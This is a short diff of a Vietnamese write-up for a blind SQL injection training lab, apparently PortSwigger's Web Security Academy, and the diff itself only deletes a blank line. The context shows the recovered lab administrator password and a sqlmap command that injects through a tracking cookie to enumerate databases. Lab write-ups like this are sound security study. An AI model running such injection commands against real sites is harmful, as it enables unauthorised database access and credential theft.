@@ -256,7 +256,6 @@ Ta tìm được độ dài của password là 20. Tiếp tục cho vào burp in
 > Vậy password của administrator trong bài lab là: aon10t6tnj02e4sfpb7u
 
 
-
 Tương tự ta dùng sqlmap để giải: 
 
 > payload:  sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbs -batch 
